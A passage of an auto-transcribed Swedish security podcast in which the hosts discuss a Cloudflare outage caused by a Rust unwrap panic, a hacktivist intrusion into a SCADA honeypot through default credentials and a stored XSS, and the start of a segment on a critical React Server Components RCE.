`1041 00:34:40,520 --> 00:34:42,520`
bli sanna. Har PRT



`1042 00:34:42,520 --> 00:34:44,520`
sagt att Cloudflare funkar dåligt



`1043 00:34:44,520 --> 00:34:46,520`
då ska de funka



`1044 00:34:46,520 --> 00:34:48,520`
dåligt. Och de vill ju



`1045 00:34:48,520 --> 00:34:50,520`
inte heller vara sämre än de två



`1046 00:34:50,520 --> 00:34:52,520`
andra stora verksamheterna.



`1047 00:34:52,520 --> 00:34:54,520`
Har två stora aktörer



`1048 00:34:54,520 --> 00:34:56,520`
haft problem så ska vi också



`1049 00:34:56,520 --> 00:34:58,520`
ha problem och så.



`1050 00:34:58,520 --> 00:35:00,520`
Så det var ju inte så att jag hade upplevt



`1051 00:35:00,520 --> 00:35:02,520`
de riktiga Cloudflare-problemen. Men när vi släppte



`1052 00:35:02,520 --> 00:35:04,520`
våran podcast, då gav de upp liksom.



`1053 00:35:04,520 --> 00:35:06,520`
Nu är det våran tidigare seppku.



`1054 00:35:06,520 --> 00:35:08,520`
Och



`1055 00:35:08,520 --> 00:35:10,520`
Cloudflare



`1056 00:35:10,520 --> 00:35:12,520`
var inte lika lång



`1057 00:35:12,520 --> 00:35:14,520`
tid dock.



`1058 00:35:14,520 --> 00:35:16,520`
Nu har jag inte huvudet



`1059 00:35:16,520 --> 00:35:18,520`
Jag tror bara det var någon timma va?



`1060 00:35:18,520 --> 00:35:20,520`
Precis, men de började i den



`1061 00:35:20,520 --> 00:35:22,520`
initiala fasen



`1062 00:35:22,520 --> 00:35:24,520`
så lite slumpmässigt



`1063 00:35:24,520 --> 00:35:26,520`
gick Cloudflare



`1064 00:35:26,520 --> 00:35:28,520`
upp och ner.



`1065 00:35:28,520 --> 00:35:30,520`
Och sen



`1066 00:35:30,520 --> 00:35:32,520`
efter en viss tid



`1067 00:35:32,520 --> 00:35:34,520`
så permanentade problemet och då



`1068 00:35:34,520 --> 00:35:36,520`
blev det mycket lättare för Cloudflare



`1069 00:35:36,520 --> 00:35:38,520`
att felsöka.



`1070 00:35:38,520 --> 00:35:40,520`
Och



`1071 00:35:40,520 --> 00:35:42,520`
anledningen till att det var väldigt förvirrande på Cloudflare



`1072 00:35:42,520 --> 00:35:44,520`
sida är att



`1073 00:35:44,520 --> 00:35:46,520`
det var ett väldigt



`1074 00:35:48,520 --> 00:35:50,520`
multifacetterat problem.



`1075 00:35:50,520 --> 00:35:52,520`
Det är nämligen så att Cloudflare



`1076 00:35:54,520 --> 00:35:56,520`
det var någon som gjorde en



`1077 00:35:56,520 --> 00:35:58,520`
refakturering av en



`1078 00:35:58,520 --> 00:36:00,520`
databas de kör på insidan



`1079 00:36:00,520 --> 00:36:02,520`
och



`1080 00:36:04,520 --> 00:36:06,520`
som logiskt sett var snyggt.



`1081 00:36:06,520 --> 00:36:08,520`
Man gjorde



`1082 00:36:08,520 --> 00:36:10,520`
någonting som skulle vara lite vackrare



`1083 00:36:10,520 --> 00:36:12,520`
i hur frågor



`1084 00:36:12,520 --> 00:36:14,520`
besvarades i den här



`1085 00:36:14,520 --> 00:36:16,520`
databasen.



`1086 00:36:16,520 --> 00:36:18,520`
Och



`1087 00:36:18,520 --> 00:36:20,520`
det var typ en



`1088 00:36:20,520 --> 00:36:22,520`
ändring som verkar logiskt



`1089 00:36:22,520 --> 00:36:24,520`
i solenat



`1090 00:36:24,520 --> 00:36:26,520`
liksom.



`1091 00:36:26,520 --> 00:36:28,520`
Det



`1092 00:36:28,520 --> 00:36:30,520`
var bara det att den kunde resultera i att



`1093 00:36:30,520 --> 00:36:32,520`
det blev lite mer metadata



`1094 00:36:32,520 --> 00:36:34,520`
som kom ut.



`1095 00:36:34,520 --> 00:36:36,520`
Utifrån frågorna



`1096 00:36:36,520 --> 00:36:38,520`
och helt plötsligt



`1097 00:36:38,520 --> 00:36:40,520`
så är det så att man har två



`1098 00:36:40,520 --> 00:36:42,520`
frontändare i Cloudflare.



`1099 00:36:42,520 --> 00:36:44,520`
Vi har den gamla frontändaren som man håller på att överge



`1100 00:36:44,520 --> 00:36:46,520`
för att gammalt är dåligt som vi alla vet.



`1101 00:36:46,520 --> 00:36:48,520`
Och man håller på att gå till den nya



`1102 00:36:48,520 --> 00:36:50,520`
som heter



`1103 00:36:50,520 --> 00:36:52,520`
den gamla heter FL och den nya



`1104 00:36:52,520 --> 00:36:54,520`
heter FL2.



`1105 00:36:54,520 --> 00:36:56,520`
Logiskt ändå.



`1106 00:36:56,520 --> 00:36:58,520`
Och och och och och



`1107 00:36:58,520 --> 00:37:00,520`
nu



`1108 00:37:00,520 --> 00:37:02,520`
så är det som följer att



`1109 00:37:02,520 --> 00:37:04,520`
när de fuckade upp databasen



`1110 00:37:04,520 --> 00:37:06,520`
eller gjorde den här ändringen



`1111 00:37:06,520 --> 00:37:08,520`
så blev en fråga



`1112 00:37:08,520 --> 00:37:10,520`
som fick ha



`1113 00:37:10,520 --> 00:37:12,520`
max 200



`1114 00:37:12,520 --> 00:37:14,520`
entries i svaret blev helt plötsligt



`1115 00:37:14,520 --> 00:37:16,520`
väldigt mycket större.



`1116 00:37:16,520 --> 00:37:18,520`
Och



`1117 00:37:20,520 --> 00:37:22,520`
på gamla



`1118 00:37:22,520 --> 00:37:24,520`
FL så blev effekten bara



`1119 00:37:24,520 --> 00:37:26,520`
att om du vill ha något bottskydd



`1120 00:37:26,520 --> 00:37:28,520`
så var hundra procenten av besökare



`1121 00:37:28,520 --> 00:37:30,520`
bottar.



`1122 00:37:30,520 --> 00:37:32,520`
Och vill du inte ha något bottskydd



`1123 00:37:32,520 --> 00:37:34,520`
så funkar det i FL.



`1124 00:37:34,520 --> 00:37:36,520`
Men på FL2 som är



`1125 00:37:36,520 --> 00:37:38,520`
rust rewrite



`1126 00:37:38,520 --> 00:37:40,520`
där går man ner i en kodpath



`1127 00:37:40,520 --> 00:37:42,520`
där man helt plötsligt gör unwrap



`1128 00:37:42,520 --> 00:37:44,520`
på en option



`1129 00:37:44,520 --> 00:37:46,520`
variabel. Det vill säga



`1130 00:37:46,520 --> 00:37:48,520`
resultvariabel.



`1131 00:37:48,520 --> 00:37:50,520`
Så att den innehåller



`1132 00:37:50,520 --> 00:37:52,520`
antingen okej eller error.



`1133 00:37:52,520 --> 00:37:54,520`
Och om du gör unwrap



`1134 00:37:54,520 --> 00:37:56,520`
och det är error så får du panic.



`1135 00:37:56,520 --> 00:37:58,520`
Hela programmet stängs ner.



`1136 00:37:58,520 --> 00:38:00,520`
Det brukar vara dåligt.



`1137 00:38:00,520 --> 00:38:02,520`
Så



`1138 00:38:02,520 --> 00:38:04,520`
om



`1139 00:38:04,520 --> 00:38:06,520`
FL2 möttes av



`1140 00:38:06,520 --> 00:38:08,520`
oväntad



`1141 00:38:08,520 --> 00:38:10,520`
konstig data



`1142 00:38:10,520 --> 00:38:12,520`
och fick ett error



`1143 00:38:12,520 --> 00:38:14,520`
så bara den stängde ner



`1144 00:38:14,520 --> 00:38:16,520`
FL2.



`1145 00:38:18,520 --> 00:38:20,520`
Och



`1146 00:38:20,520 --> 00:38:22,520`
det är



`1147 00:38:22,520 --> 00:38:24,520`
lite konstigt



`1148 00:38:24,520 --> 00:38:26,520`
beteende skulle jag säga.



`1149 00:38:26,520 --> 00:38:28,520`
Om det ska upptäckts under någon slags test?



`1150 00:38:30,520 --> 00:38:32,520`
Det beror på vad du menar.



`1151 00:38:32,520 --> 00:38:34,520`
Vad är det som ska upptäckts i testen?



`1152 00:38:34,520 --> 00:38:36,520`
Innan man gör en ändring



`1153 00:38:36,520 --> 00:38:38,520`
i en miljö någonstans så testar man ofta saker.



`1154 00:38:38,520 --> 00:38:40,520`
Och helst då



`1155 00:38:40,520 --> 00:38:42,520`
i så nära produktionslika



`1156 00:38:42,520 --> 00:38:44,520`
funktioner som möjligt.



`1157 00:38:44,520 --> 00:38:46,520`
Problemet var väl att



`1158 00:38:46,520 --> 00:38:48,520`
du ändrade



`1159 00:38:48,520 --> 00:38:50,520`
hur en databas beter sig.



`1160 00:38:50,520 --> 00:38:52,520`
Och det



`1161 00:38:52,520 --> 00:38:54,520`
resulterade i att en annan



`1162 00:38:54,520 --> 00:38:56,520`
komponent kraschar.



`1163 00:38:56,520 --> 00:38:58,520`
Och det var ju ett testsystem först.



`1164 00:38:58,520 --> 00:39:00,520`
Då hade ju samma beteende förhoppningsvis



`1165 00:39:00,520 --> 00:39:02,520`
hänt där.



`1166 00:39:04,520 --> 00:39:06,520`
Det beror på vad du menar.



`1167 00:39:06,520 --> 00:39:08,520`
Men om du tänker



`1168 00:39:08,520 --> 00:39:10,520`
eftersom att det är ett integrationsproblem



`1169 00:39:10,520 --> 00:39:12,520`
så hade ju ett klassiskt unittest



`1170 00:39:12,520 --> 00:39:14,520`
inte hittat det här.



`1171 00:39:14,520 --> 00:39:16,520`
Nej, jag tänker mer att man gör det på riktigt.



`1172 00:39:16,520 --> 00:39:18,520`
Det här är vår testmiljö. Komplett testmiljö.



`1173 00:39:18,520 --> 00:39:20,520`
Gör ändringen där. Se om någonting går åt helvete.



`1174 00:39:20,520 --> 00:39:22,520`
Ja, man kan säga så här.



`1175 00:39:22,520 --> 00:39:24,520`
En tillräckligt god testprocess hade ju upptäckt det här.



`1176 00:39:24,520 --> 00:39:26,520`
Det är ju också så



`1177 00:39:26,520 --> 00:39:28,520`
att en bra



`1178 00:39:28,520 --> 00:39:30,520`
kodreview hade åtminstone noterat



`1179 00:39:30,520 --> 00:39:32,520`
att rustkoden



`1180 00:39:32,520 --> 00:39:34,520`
innehåller en unwrap.



`1181 00:39:34,520 --> 00:39:36,520`
Det verkar lite



`1182 00:39:36,520 --> 00:39:38,520`
suspekt.



`1183 00:39:38,520 --> 00:39:40,520`
Jag oroar mig med att läsa



`1184 00:39:40,520 --> 00:39:42,520`
vad olika folk och tyckare



`1185 00:39:42,520 --> 00:39:44,520`
har för åsikt



`1186 00:39:44,520 --> 00:39:46,520`
om det här.



`1187 00:39:46,520 --> 00:39:48,520`
Top 1 nivån på



`1188 00:39:48,520 --> 00:39:50,520`
Bright Minds var ju



`1189 00:39:50,520 --> 00:39:52,520`
de som tyckte att man inte hanterar sina



`1190 00:39:52,520 --> 00:39:54,520`
try-catch. Det är ju en nybörjare.



`1191 00:39:54,520 --> 00:39:56,520`
Det finns inte try-catch



`1192 00:39:56,520 --> 00:39:58,520`
i rust.



`1193 00:39:58,520 --> 00:40:00,520`
Grattis, du har verkligen



`1194 00:40:00,520 --> 00:40:02,520`
failat på att ens förstå



`1195 00:40:02,520 --> 00:40:04,520`
problematiken.



`1196 00:40:04,520 --> 00:40:06,520`
Fan, nu har det varit fel på internet igen.



`1197 00:40:06,520 --> 00:40:08,520`
Men



`1198 00:40:08,520 --> 00:40:10,520`
och sen så är det ju massor som säger att



`1199 00:40:10,520 --> 00:40:12,520`
lintregler



`1200 00:40:12,520 --> 00:40:14,520`
tar just den där. Det är ju också så att



`1201 00:40:14,520 --> 00:40:16,520`
koda med unwrap är tydligen



`1202 00:40:16,520 --> 00:40:18,520`
lite omodernt. Du ska kunna



`1203 00:40:18,520 --> 00:40:20,520`
använda frågeteckenoperatorn om du vill ha



`1204 00:40:20,520 --> 00:40:22,520`
lite syntaxsocker



`1205 00:40:22,520 --> 00:40:24,520`
för att slippa hanteringar



`1206 00:40:24,520 --> 00:40:26,520`
i din kod och så.



`1207 00:40:26,520 --> 00:40:28,520`
Och roligast



`1208 00:40:28,520 --> 00:40:30,520`
var ju de jag såg som i kommentarer



`1209 00:40:30,520 --> 00:40:32,520`
tyckte att de först kollar med if-satser



`1210 00:40:32,520 --> 00:40:34,520`
om det kommer gå bra i framtiden



`1211 00:40:34,520 --> 00:40:36,520`
och sen gör de



`1212 00:40:36,520 --> 00:40:38,520`
unwrap för att de vet från koden



`1213 00:40:38,520 --> 00:40:40,520`
ovan att det ska vara så här.



`1214 00:40:40,520 --> 00:40:42,520`
Men ni beskriver



`1215 00:40:42,520 --> 00:40:44,520`
typ hur man kodar i C



`1216 00:40:44,520 --> 00:40:46,520`
och inte hur du använder



`1217 00:40:46,520 --> 00:40:48,520`
rust.



`1218 00:40:48,520 --> 00:40:50,520`
Det verkar ju finnas väldigt många som



`1219 00:40:52,520 --> 00:40:54,520`
kodar i rust utan



`1220 00:40:54,520 --> 00:40:56,520`
att nyttja rusts inbyggda funktioner.



`1221 00:40:58,520 --> 00:41:00,520`
Det låter ju inte orimligt alls.



`1222 00:41:00,520 --> 00:41:02,520`
Men det är ju intressant för



`1223 00:41:02,520 --> 00:41:04,520`
man tänker ju sig ändå att cloudflare



`1224 00:41:04,520 --> 00:41:06,520`
ska ha



`1225 00:41:06,520 --> 00:41:08,520`
de ska förhoppningsvis



`1226 00:41:08,520 --> 00:41:10,520`
ha ganska mycket bright minds och



`1227 00:41:10,520 --> 00:41:12,520`
koll och ordning och så där.



`1228 00:41:12,520 --> 00:41:14,520`
Man tänker sig att de



`1229 00:41:14,520 --> 00:41:16,520`
stora fangs och allt vad man kallar det



`1230 00:41:16,520 --> 00:41:18,520`
ska vara väldigt bra och



`1231 00:41:18,520 --> 00:41:20,520`
extraordinära utvecklare där.



`1232 00:41:20,520 --> 00:41:22,520`
Men det här



`1233 00:41:22,520 --> 00:41:24,520`
det känns ju som att man



`1234 00:41:24,520 --> 00:41:26,520`
det är liksom både den här



`1235 00:41:26,520 --> 00:41:28,520`
nybörjarnivå på kodning



`1236 00:41:28,520 --> 00:41:30,520`
i rustkoden.



`1237 00:41:30,520 --> 00:41:32,520`
Det är väl så att det är helt vanliga



`1238 00:41:32,520 --> 00:41:34,520`
människor överallt?



`1239 00:41:34,520 --> 00:41:36,520`
Jo men



`1240 00:41:36,520 --> 00:41:38,520`
det är ju också så att det betyder



`1241 00:41:38,520 --> 00:41:40,520`
att det inte finns en process som upptäcker



`1242 00:41:40,520 --> 00:41:42,520`
att du



`1243 00:41:42,520 --> 00:41:44,520`
alltså



`1244 00:41:44,520 --> 00:41:46,520`
det är ju en sak att någon



`1245 00:41:46,520 --> 00:41:48,520`
kodar det här och checkar in det



`1246 00:41:48,520 --> 00:41:50,520`
men sen



`1247 00:41:50,520 --> 00:41:52,520`
accepterar ju tydligen alla byggen



`1248 00:41:52,520 --> 00:41:54,520`
och allting i det här.



`1249 00:41:54,520 --> 00:41:56,520`
Jag gjorde som en kul grej var ju att jag



`1250 00:41:56,520 --> 00:41:58,520`
kollade på



`1251 00:41:58,520 --> 00:42:00,520`
vilken kod jag har skrivit



`1252 00:42:00,520 --> 00:42:02,520`
historiskt sett då för jag tänkte sådant såhär



`1253 00:42:02,520 --> 00:42:04,520`
Ja men du är ju en rapper i det som är koden.



`1254 00:42:04,520 --> 00:42:06,520`
Det gjorde jag inte.



`1255 00:42:06,520 --> 00:42:08,520`
Ni behöver anställa petar uppenbarligen.



`1256 00:42:08,520 --> 00:42:10,520`
Ni behöver anställa petar uppenbarligen.



`1257 00:42:10,520 --> 00:42:12,520`
Ja men jag tycker ändå det är lite roligt att



`1258 00:42:12,520 --> 00:42:14,520`
för det blir



`1259 00:42:14,520 --> 00:42:16,520`
sannolikt åtminstone för mig lite grann



`1260 00:42:18,520 --> 00:42:20,520`
att det finns någon sorts



`1261 00:42:20,520 --> 00:42:22,520`
rockekodning över det här



`1262 00:42:22,520 --> 00:42:24,520`
som någon som är



`1263 00:42:24,520 --> 00:42:26,520`
relativt nybörjare inom rust borde



`1264 00:42:26,520 --> 00:42:28,520`
förstå att det inte är det här man gör



`1265 00:42:28,520 --> 00:42:30,520`
liksom.



`1266 00:42:30,520 --> 00:42:32,520`
Vi förväntar oss bättre och klart



`1267 00:42:32,520 --> 00:42:34,520`
fler utifrån det.



`1268 00:42:34,520 --> 00:42:36,520`
Vi är inte arga vi är bara väldigt väldigt besvikna.



`1269 00:42:36,520 --> 00:42:38,520`
Jag såg någon som ställde frågan



`1270 00:42:40,520 --> 00:42:42,520`
Linux som använder rust



`1271 00:42:42,520 --> 00:42:44,520`
har de sådana här problem också?



`1272 00:42:44,520 --> 00:42:46,520`
Och då någon som förklarade att



`1273 00:42:46,520 --> 00:42:48,520`
nej det här är syntaxsockret för



`1274 00:42:48,520 --> 00:42:50,520`
men



`1275 00:42:50,520 --> 00:42:52,520`
det finns inte ens med i



`1276 00:42:52,520 --> 00:42:54,520`
så som rust startar upp i linuxkoden



`1277 00:42:54,520 --> 00:42:56,520`
de har inte



`1278 00:42:56,520 --> 00:42:58,520`
det här sockret liksom.



`1279 00:42:58,520 --> 00:43:00,520`
Det känns ju bra.



`1280 00:43:00,520 --> 00:43:02,520`
Faktiskt.



`1281 00:43:02,520 --> 00:43:04,520`
Ska vi hoppa vidare?



`1282 00:43:04,520 --> 00:43:06,520`
Ska vi hoppa vidare?



`1283 00:43:06,520 --> 00:43:08,520`
Jag satt och läste lite nyheter



`1284 00:43:08,520 --> 00:43:10,520`
inför det här och såg en rubrik



`1285 00:43:10,520 --> 00:43:12,520`
som jag tyckte lät coolt.



`1286 00:43:12,520 --> 00:43:14,520`
Och det stod typ



`1287 00:43:14,520 --> 00:43:16,520`
SCADA PLC



`1288 00:43:16,520 --> 00:43:18,520`
remote takeover with XSS



`1289 00:43:18,520 --> 00:43:20,520`
All the words.



`1290 00:43:20,520 --> 00:43:22,520`
XSS det låter dåligt.



`1291 00:43:22,520 --> 00:43:24,520`
Jag bara såhär, okej



`1292 00:43:24,520 --> 00:43:26,520`
så du har typ



`1293 00:43:26,520 --> 00:43:28,520`
SCA och SCADA pilar med XSS



`1294 00:43:28,520 --> 00:43:30,520`
Okej det här måste vi klicka vidare på



`1295 00:43:30,520 --> 00:43:32,520`
tyckte jag.



`1296 00:43:32,520 --> 00:43:34,520`
Så var inte fallet dock tyvärr



`1297 00:43:34,520 --> 00:43:36,520`
det var mycket mindre coolt än så.



`1298 00:43:36,520 --> 00:43:38,520`
Vi hade ju det en gång, vad hette de?



`1299 00:43:38,520 --> 00:43:40,520`
Det var något svenskt bolag som hade hela



`1300 00:43:40,520 --> 00:43:42,520`
Outta dem.



`1301 00:43:42,520 --> 00:43:44,520`
Vad fan hette de?



`1302 00:43:44,520 --> 00:43:46,520`
Det låg ju



`1303 00:43:46,520 --> 00:43:48,520`
authentication i javascript.



`1304 00:43:48,520 --> 00:43:50,520`
Ja precis.



`1305 00:43:50,520 --> 00:43:52,520`
Det var en enkel bypass.



`1306 00:43:52,520 --> 00:43:54,520`
Men det var faktiskt inte det som hade hänt här



`1307 00:43:54,520 --> 00:43:56,520`
även om det hade varit coolt.



`1308 00:43:56,520 --> 00:43:58,520`
Ja det hade varit roligt.



`1309 00:43:58,520 --> 00:44:00,520`
Det som är så här då, att Forescout som är



`1310 00:44:00,520 --> 00:44:02,520`
någon form av säkerhetsföretag



`1311 00:44:02,520 --> 00:44:04,520`
de kör lite honeypots.



`1312 00:44:04,520 --> 00:44:06,520`
Och i det här fallet så kör de



`1313 00:44:06,520 --> 00:44:08,520`
human interface för SCADA



`1314 00:44:08,520 --> 00:44:10,520`
pilar på nätet.



`1315 00:44:10,520 --> 00:44:12,520`
Och så fångade de upp vad som hände där.



`1316 00:44:12,520 --> 00:44:14,520`
Och i september 2025



`1317 00:44:14,520 --> 00:44:16,520`
så kom ett angrepp



`1318 00:44:16,520 --> 00:44:18,520`
från en relativt nystartad



`1319 00:44:18,520 --> 00:44:20,520`
hackergrupp, rysk sådan



`1320 00:44:20,520 --> 00:44:22,520`
som kallar sig själva för Toonet.



`1321 00:44:22,520 --> 00:44:24,520`
Och de



`1322 00:44:24,520 --> 00:44:26,520`
Toonet\!



`1323 00:44:26,520 --> 00:44:28,520`
De tog sig in då i den här



`1324 00:44:28,520 --> 00:44:30,520`
PLC, verkar det som utan att fatta



`1325 00:44:30,520 --> 00:44:32,520`
att det var en honeypot.



`1326 00:44:32,520 --> 00:44:34,520`
Och



`1327 00:44:34,520 --> 00:44:36,520`
stängde av larm och



`1328 00:44:36,520 --> 00:44:38,520`
drog ut data



`1329 00:44:38,520 --> 00:44:40,520`
tog bort all PLC logik



`1330 00:44:40,520 --> 00:44:42,520`
typ, bara för att fucka med den.



`1331 00:44:42,520 --> 00:44:44,520`
Och sen avslutade de med att använda



`1332 00:44:44,520 --> 00:44:46,520`
en CVE



`1333 00:44:46,520 --> 00:44:48,520`
med en XSS, stored XSS



`1334 00:44:48,520 --> 00:44:50,520`
för att göra defacement



`1335 00:44:50,520 --> 00:44:52,520`
på den här prylen då.



`1336 00:44:52,520 --> 00:44:54,520`
Så det var därifrån rubriken kom.



`1337 00:44:54,520 --> 00:44:56,520`
Men så mycket mindre coolt.



`1338 00:44:56,520 --> 00:44:58,520`
Tyvärr.



`1339 00:44:58,520 --> 00:45:00,520`
Och om man kollar då på



`1340 00:45:00,520 --> 00:45:02,520`
timelinen, det de faktiskt gjorde



`1341 00:45:02,520 --> 00:45:04,520`
så är det att de har, ja de har skallat nätet



`1342 00:45:04,520 --> 00:45:06,520`
de har hittat en PLC som kör med någon



`1343 00:45:06,520 --> 00:45:08,520`
standard mjukvara typ



`1344 00:45:08,520 --> 00:45:10,520`
SCADA BL



`1345 00:45:10,520 --> 00:45:12,520`
eller vad de heter, något sånt där liknande.



`1346 00:45:12,520 --> 00:45:14,520`
Och sen så är



`1347 00:45:14,520 --> 00:45:16,520`
sättet de har kommit in då är



`1348 00:45:16,520 --> 00:45:18,520`
att de har kört default credentials.



`1349 00:45:18,520 --> 00:45:20,520`
Admin-admin.



`1350 00:45:20,520 --> 00:45:22,520`
Så det var typ så coolt det var.



`1351 00:45:22,520 --> 00:45:24,520`
Och sen så har de då gått in och kört



`1352 00:45:24,520 --> 00:45:26,520`
database enumeration från ett admin interface



`1353 00:45:26,520 --> 00:45:28,520`
dragit ut databasen



`1354 00:45:28,520 --> 00:45:30,520`
basically



`1355 00:45:30,520 --> 00:45:32,520`
fuckat med alla larm



`1356 00:45:32,520 --> 00:45:34,520`
tagit bort allting av värde



`1357 00:45:34,520 --> 00:45:36,520`
och avslutat med att



`1358 00:45:36,520 --> 00:45:38,520`
defacera det hela.



`1359 00:45:38,520 --> 00:45:40,520`
Och jag vet inte, det här företaget



`1360 00:45:40,520 --> 00:45:42,520`
som jag nämnde vad de hette



`1361 00:45:42,520 --> 00:45:44,520`
men nu har jag glömt, Forescout



`1362 00:45:44,520 --> 00:45:46,520`
de vill få det här till



`1363 00:45:46,520 --> 00:45:48,520`
att det här är ett



`1364 00:45:48,520 --> 00:45:50,520`
skifte i hur hacktivismgrupper



`1365 00:45:50,520 --> 00:45:52,520`
arbetar.



`1366 00:45:52,520 --> 00:45:54,520`
Och att de har gått från att göra



`1367 00:45:54,520 --> 00:45:56,520`
typ DDoS-attacker



`1368 00:45:56,520 --> 00:45:58,520`
till att göra mer sofistikerade grejer



`1369 00:45:58,520 --> 00:46:00,520`
och jag bara, really?



`1370 00:46:00,520 --> 00:46:02,520`
Nej jag vet inte, fan alltså.



`1371 00:46:02,520 --> 00:46:04,520`
Det krävs nog lite mer data för att



`1372 00:46:04,520 --> 00:46:06,520`
dra hem den poängen. Lite så, alltså



`1373 00:46:06,520 --> 00:46:08,520`
det de har sett är att okej det är



`1374 00:46:08,520 --> 00:46:10,520`
IP från, det är ryska och



`1375 00:46:10,520 --> 00:46:12,520`
iranska tror jag det var. Vi vet det.



`1376 00:46:12,520 --> 00:46:14,520`
IP Ranger



`1377 00:46:14,520 --> 00:46:16,520`
som har scannat nät.



`1378 00:46:16,520 --> 00:46:18,520`
De har använt admin-admin för att komma in



`1379 00:46:18,520 --> 00:46:20,520`
och sen så har de använt en publikt available



`1380 00:46:20,520 --> 00:46:22,520`
stored cross-site scripting



`1381 00:46:22,520 --> 00:46:24,520`
i det här ramverket för att defacera.



`1382 00:46:24,520 --> 00:46:26,520`
Där det stod typ såhär



`1383 00:46:26,520 --> 00:46:28,520`
2Net was here, fuck you.



`1384 00:46:28,520 --> 00:46:30,520`
Det var sånt som jag tyckte var coolt



`1385 00:46:30,520 --> 00:46:32,520`
när jag var tolv. Ja, eller hur, verkligen.



`1386 00:46:32,520 --> 00:46:34,520`
Och det känns ju som att det är ungefär den



`1387 00:46:34,520 --> 00:46:36,520`
sofistikeringsgraden på den här gruppen.



`1388 00:46:36,520 --> 00:46:38,520`
Så, I don't know. Sen så



`1389 00:46:38,520 --> 00:46:40,520`
dök det upp lite mer när jag läste vidare



`1390 00:46:40,520 --> 00:46:42,520`
som visade



`1391 00:46:42,520 --> 00:46:44,520`
på att de förmodligen kör med



`1392 00:46:44,520 --> 00:46:46,520`
en massa



`1393 00:46:46,520 --> 00:46:48,520`
ja men den typen av verktyg som folk i



`1394 00:46:48,520 --> 00:46:50,520`
vår bransch jobbar med typ



`1395 00:46:50,520 --> 00:46:52,520`
callback, OST



`1396 00:46:54,520 --> 00:46:56,520`
vad heter det, server.



`1397 00:46:56,520 --> 00:46:58,520`
Så att du kan



`1398 00:46:58,520 --> 00:47:00,520`
de automatiserar egentligen att de skickar ut



`1399 00:47:00,520 --> 00:47:02,520`
publikt kända



`1400 00:47:02,520 --> 00:47:04,520`
CVE exploits överallt.



`1401 00:47:04,520 --> 00:47:06,520`
Se om de får en pingback



`1402 00:47:06,520 --> 00:47:08,520`
till sin OST som de har hostat i Google.



`1403 00:47:08,520 --> 00:47:10,520`
Och sen så kör de därifrån. Bounty please.



`1404 00:47:10,520 --> 00:47:12,520`
Ja men det är verkligen



`1405 00:47:12,520 --> 00:47:14,520`
så här, jag vet inte fan om det här



`1406 00:47:14,520 --> 00:47:16,520`
är ett skifte till en mer



`1407 00:47:16,520 --> 00:47:18,520`
mer kompetenta



`1408 00:47:18,520 --> 00:47:20,520`
hacktivismgrupp. Jag tror vi har sett coolare



`1409 00:47:20,520 --> 00:47:22,520`
grejer. Men nej, de fixar ju en



`1410 00:47:22,520 --> 00:47:24,520`
post på



`1411 00:47:24,520 --> 00:47:26,520`
Hacker News så att jag var tvungen att ta upp det.



`1412 00:47:26,520 --> 00:47:28,520`
Mest för att jag är besviken på Hacker News.



`1413 00:47:30,520 --> 00:47:32,520`
Men ska vi prata om någonting sjukt?



`1414 00:47:32,520 --> 00:47:34,520`
Ja. Den största



`1415 00:47:34,520 --> 00:47:36,520`
sålbarheten i React



`1416 00:47:36,520 --> 00:47:38,520`
någonsin. Oh, so far.



`1417 00:47:38,520 --> 00:47:40,520`
Ja, 10,0 CVSS släpptes



`1418 00:47:40,520 --> 00:47:42,520`
I Ghost or Eleven. Idag, gör den det?



`1419 00:47:42,520 --> 00:47:44,520`
Nej. Men om den hade gjort det



`1420 00:47:44,520 --> 00:47:46,520`
så hade det inte varit en värld. Men det är faktiskt sant.



`1421 00:47:46,520 --> 00:47:48,520`
Det är alltså HTTP



`1422 00:47:48,520 --> 00:47:50,520`
post request till RCE i React.



`1423 00:47:50,520 --> 00:47:52,520`
Damn. Det är oautenticerat



`1424 00:47:52,520 --> 00:47:54,520`
såklart. Nej men vänta här nu.



`1425 00:47:54,520 --> 00:47:56,520`
Precis.



`1426 00:47:56,520 --> 00:47:58,520`
Oautenticerad post



`1427 00:47:58,520 --> 00:48:00,520`
till RCE.



`1428 00:48:00,520 --> 00:48:02,520`
Det är fett. Det är coolt.



`1429 00:48:02,520 --> 00:48:04,520`
Och det bygger på någon, jag är



`1430 00:48:04,520 --> 00:48:06,520`
långt ifrån expert på ämnet.



`1431 00:48:06,520 --> 00:48:08,520`
Men det bygger på en komponent som heter



`1432 00:48:08,520 --> 00:48:10,520`
RCS, alltså



`1433 00:48:10,520 --> 00:48:12,520`
React Server Components.



`1434 00:48:12,520 --> 00:48:14,520`
Som är ganska nytt



`1435 00:48:14,520 --> 00:48:16,520`
så som jag förstår det när jag har läst.



`1436 00:48:16,520 --> 00:48:18,520`
Och det är en



`1437 00:48:18,520 --> 00:48:20,520`
ja, det är logik hur



`1438 00:48:20,520 --> 00:48:22,520`
klient och servn egentligen



`1439 00:48:22,520 --> 00:48:24,520`
kommunicerar. Mycket



`1440 00:48:24,520 --> 00:48:26,520`
magi, så kontra det har det.



`1441 00:48:26,520 --> 00:48:28,520`
Mycket automatik. Men det gör



`1442 00:48:28,520 --> 00:48:30,520`
också att det blir en ökad attackyta då.



`1443 00:48:30,520 --> 00:48:32,520`
Så



`1444 00:48:32,520 --> 00:48:34,520`
ganska roligt.



`1445 00:48:34,520 --> 00:48:36,520`
Tidslinjer då innan vi går in på lite mer detaljer.



`1446 00:48:36,520 --> 00:48:38,520`
29 november



`1447 00:48:38,520 --> 00:48:40,520`
så hittar en



`1448 00:48:40,520 --> 00:48:42,520`
forskare Lachlan



`1449 00:48:42,520 --> 00:48:44,520`
Davidsson. Han rapporterar



`1450 00:48:44,520 --> 00:48:46,520`
detta. Jag tror att han också är lite



`1451 00:48:46,520 --> 00:48:48,520`
ihopkopplad med React på något sätt.



`1452 00:48:48,520 --> 00:48:50,520`
30 november, React bekräftar att börja



`1453 00:48:50,520 --> 00:48:52,520`
greja. Och



`1454 00:48:52,520 --> 00:48:54,520`
idag då patchas det och så är det



`1455 00:48:54,520 --> 00:48:56,520`
full disclosure



`1456 00:48:56,520 --> 00:48:58,520`
egentligen. Det är ganska snabbt ändå.



`1457 00:48:58,520 --> 00:49:00,520`
En helg.



`1458 00:49:00,520 --> 00:49:02,520`
Ja, det hade inte Cloudfair.



`1459 00:49:02,520 --> 00:49:04,520`
Och det här är ju då liksom i version



`1460 00:49:04,520 --> 00:49:06,520`
19 liksom. Men okej, lite



`1461 00:49:06,520 --> 00:49:08,520`
tekniska detaljer då. Vad är



`1462 00:49:08,520 --> 00:49:10,520`
det för endpunkt som exponeras av React?



`1463 00:49:10,520 --> 00:49:12,520`
I standardutförandet som tillåter det här?



